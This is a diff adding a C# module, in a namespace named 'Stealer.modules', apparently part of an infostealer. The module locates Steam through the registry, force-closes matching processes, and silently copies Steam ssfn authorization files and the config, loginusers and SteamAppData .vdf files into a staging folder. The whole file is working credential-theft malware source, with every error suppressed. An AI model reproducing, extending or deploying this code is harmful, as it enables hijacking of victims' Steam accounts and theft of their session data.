@@ -1,0 +1,98 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Diagnostics;
+using System.IO;
+
+namespace Stealer.modules
+{
+  internal class Steam
+  {
+    public static void CopySteam()
+    {
+      string name = "Name";
+      string locationSteam = Steam.GetLocationSteam();
+      string str = Program.path + "\\Steam";
+      if (!Directory.Exists(locationSteam))
+        return;
+      Directory.CreateDirectory(str);
+      Steam.Closing(name);
+      try
+      {
+        foreach (string file in Directory.GetFiles(locationSteam, "ssfn*"))
+        {
+          string fileName = Path.GetFileName(file);
+          File.Copy(file, Path.Combine(str, fileName), true);
+        }
+        if (File.Exists(locationSteam + "\\config\\config.vdf"))
+          File.Copy(locationSteam + "\\config\\config.vdf", str + "\\config.vdf");
+        if (File.Exists(locationSteam + "\\config\\loginusers.vdf"))
+          File.Copy(locationSteam + "\\config\\loginusers.vdf", str + "\\loginusers.vdf");
+        if (!File.Exists(locationSteam + "\\config\\SteamAppData.vdf"))
+          return;
+        File.Copy(locationSteam + "\\config\\SteamAppData.vdf", str + "\\SteamAppData.vdf");
+      }
+      catch
+      {
+      }
+    }
+
+    private static string GetLocationSteam()
+    {
+      string empty = string.Empty;
+      if (Environment.Is64BitOperatingSystem)
+      {
+        try
+        {
+          empty = Registry.LocalMachine.OpenSubKey("Software\\Wow6432Node\\Valve\\Steam").GetValue("InstallPath").ToString();
+        }
+        catch
+        {
+        }
+      }
+      else
+      {
+        try
+        {
+          empty = Registry.LocalMachine.OpenSubKey("Software\\Valve\\Steam").GetValue("InstallPath").ToString();
+        }
+        catch
+        {
+        }
+      }
+      return empty;
+    }
+
+    public static void Closing(string name)
+    {
+      try
+      {
+        foreach (Process process in Process.GetProcesses())
+        {
+          if (process.ProcessName.Contains(name))
+          {
+            try
+            {
+              process.CloseMainWindow();
+              if (!process.HasExited)
+              {
+                try
+                {
+                  process.Kill();
+                }
+                catch
+                {
+                }
+              }
+            }
+            catch
+            {
+            }
+          }
+        }
+      }
+      catch
+      {
+      }
+    }
+  }
+}
